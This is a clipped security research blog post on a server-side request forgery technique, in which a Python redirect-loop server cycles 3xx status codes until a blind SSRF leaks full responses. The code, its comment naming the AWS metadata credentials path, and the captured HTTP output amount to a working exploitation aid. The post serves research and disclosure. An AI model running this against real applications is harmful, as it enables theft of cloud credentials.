---
title: Novel SSRF Technique Involving HTTP Redirect Loops › Searchlight Cyber
source: https://slcyber.io/research-center/novel-ssrf-technique-involving-http-redirect-loops/
author:
  - Shubham Shah
published: 2025-06-23
created: 2026-02-17
description: It's difficult to show impact for Server-Side Request Forgery (SSRF) vulnerabilities when you cannot see the full HTTP response. Our research team details a novel technique that allowed for us to leak the full HTTP response, even though the SSRF seemed like it was blind.
tags:
  - clippings/articles
  - SSRF
---
# Novel SSRF Technique Involving HTTP Redirect Loops › Searchlight Cyber

> [!summary]+
> > This research post details a novel Server-Side Request Forgery (SSRF) technique involving HTTP redirect loops to bypass response parsing and fully leak HTTP responses, including 200 OK responses.
> The technique was discovered while testing enterprise software that used C++ bindings and libcurl. Standard SSRF testing (single/few redirects, status codes 401/500) yielded limited success; 500 status codes leaked full responses, but 200 OK responses (critical for cloud metadata credentials) did not.
> The key discovery was that a redirect loop, incrementally changing HTTP status codes (from 301 to 310) across multiple redirects, caused an error state in the application that led to the full HTTP redirect chain and final 200 OK response being leaked.
> Specifically, responses from status code 305 and beyond were leaked. The researchers hypothesize this is due to an application-level error state triggered after a certain number of redirects (more than five), rather than a libcurl-specific issue.
> This method proved successful in obtaining AWS metadata credentials and is proposed as a valuable approach for exploiting difficult blind SSRF vulnerabilities where 200 OK responses are typically unreadable.

[Blind SSRF](../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Server%20Side%20Request%20Forgery%20(SSRF).md#Blind%20SSRF) bugs are tricky to exploit, and obtaining the full HTTP response is one of the primary goals with any SSRF vulnerability.

However, what if you’re in a situation where the application just refuses to return the full HTTP response? Perhaps it’s performing some parsing logic, and your response does not fit its specifications, leading to an uneventful parsing error. These were the same challenges we faced recently when looking at widely used enterprise software.

We saw some unexpected behavior in this software that led to the leakage of the full redirect chain, including the final 200 OK response.

### SSRF Testing Flow

Our typical SSRF testing flow involves interrogating the way the application responds to specific status codes. We started with understanding if the application could follow redirects. If this is true, we can then check how many redirects it can follow (MAX\_REDIRECTS) and how it responds in this scenario.

These attempts were not successful. With a single redirect or a few redirects, the application would fail with a JSON parsing error such as `Exception: Invalid JSON`. When increasing the number of redirects, we found that the application followed up to 30 redirects but would fail with a different exception: `NetworkException` with no `Invalid JSON` error.

Since the above attempts did not lead to a full response being leaked, we moved on to testing HTTP status codes that may be treated differently

On a 500 HTTP status code response, the application gave us the full HTTP response.

## Looping through every HTTP response code

Since we knew that the application was following redirects for 3xx status codes, intuitively, in a true black box fashion, we had a theory that maybe certain status codes in the 3xx range could trigger the same error state as a 500 status code.

> What if we iterated through more 3xx status codes?

We created a basic [Python](../Dev,%20ICT%20&%20Cybersec/Dev,%20scripting%20&%20OS/Python.md) server that had the following logic:

```python
@app.route('/redir', methods=['GET', 'POST'])
def redir():
    """Handle redirects with loop counter - after 10 redirects, go to final SSRF location."""
    # Get the current redirect count from query parameter, default to 0
    redirect_count = int(request.args.get('count', 0))

    # Increment the counter
    redirect_count += 1
    status_code = 301 + redirect_count
    # If we've reached 10 redirects, redirect to our desired location
    # To grab AWS metadata keys, you would hit http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name-here
    if redirect_count >= 10:
        return redirect("http://example.com", code=302)
    print("trying: " + str(status_code))
    # Otherwise, redirect back to /redir with incremented counter
    return redirect(f"/redir?count={redirect_count}", code=status_code)

@app.route('/start', methods=['POST', 'GET'])
def start():
    """Starting point for redirect loop."""
    return redirect("/redir", code=302)
```

The above code performs a redirect loop, incrementing the HTTP status code on each subsequent request. When exploiting the SSRF issue by pointing it to a URL hosting the above logic, the application responded with the full HTTP redirect chain and responses:

```http
HTTP/1.1 305 USE PROXY
Date: Sun, 01 Jun 2025 02:43:18 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 215
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: /redir?count=4

HTTP/1.1 306 SWITCH PROXY
Date: Sun, 01 Jun 2025 02:43:18 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 215
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: /redir?count=5

HTTP/1.1 307 TEMPORARY REDIRECT
Date: Sun, 01 Jun 2025 02:43:19 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 215
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: /redir?count=6

HTTP/1.1 308 PERMANENT REDIRECT
Date: Sun, 01 Jun 2025 02:43:19 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 215
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: /redir?count=7

HTTP/1.1 309 UNKNOWN
Date: Sun, 01 Jun 2025 02:43:20 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 215
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: /redir?count=8

HTTP/1.1 310 UNKNOWN
Date: Sun, 01 Jun 2025 02:43:20 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 215
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: /redir?count=9

HTTP/1.1 302 FOUND
Date: Sun, 01 Jun 2025 02:43:21 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 225
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: https://example.com

HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Type: text/html
ETag: "84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"
Last-Modified: Mon, 13 Jan 2025 20:11:20 GMT
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 648
Cache-Control: max-age=1824
Date: Sun, 01 Jun 2025 02:43:21 GMT
Alt-Svc: h3=":443"; ma=93600,h3-29=":443"; ma=93600,quic=":443"; ma=93600; v="43"
Connection: keep-alive

<!doctype html>

... omitted for brevity ... (full response)
```

This technique may sound obscure to you, but it has now worked for us in several situations where we would not have been able to see the full HTTP response for 200 OK responses, but could see the full HTTP response for 500 status codes.

So, the next time you’re working on a difficult blind SSRF vulnerability, remember this research post. You might be surprised by the outcome!